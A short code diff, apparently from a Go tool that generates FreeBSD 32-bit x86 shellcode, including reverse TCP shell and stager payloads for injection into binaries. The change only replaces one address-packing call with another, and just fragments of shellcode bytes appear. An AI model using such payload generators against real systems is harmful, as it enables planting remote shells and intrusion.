@@ -29,7 +29,7 @@ func reverse_tcp_shell_freebsd_intel_32(params api.Parameters) ([]byte, error) {
 	shellcode1 += "\x85\xc0\x74\x07"
 	shellcode1 += "\xbd"
 	//JMP to e_entry
-	if as, err := api.PackAddr(entry); err == nil {
+	if as, err := api.PackUint32(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -72,7 +72,7 @@ func reverse_tcp_stager_freebsd_intel_32(params api.Parameters) ([]byte, error) 
 	shellcode1 += "\x5A"     // pop edx
 	shellcode1 += "\x85\xc0\x74\x07"
 	shellcode1 += "\xbd"
-	if as, err := api.PackAddr(entry); err == nil {
+	if as, err := api.PackUint32(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -104,7 +104,7 @@ func user_shellcode_freebsd_intel_32(params api.Parameters) ([]byte, error) {
 	shellcode1 += "\x5A"     // pop edx
 	shellcode1 += "\x85\xc0\x74\x07"
 	shellcode1 += "\xbd"
-	if as, err := api.PackAddr(entry); err == nil {
+	if as, err := api.PackUint32(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
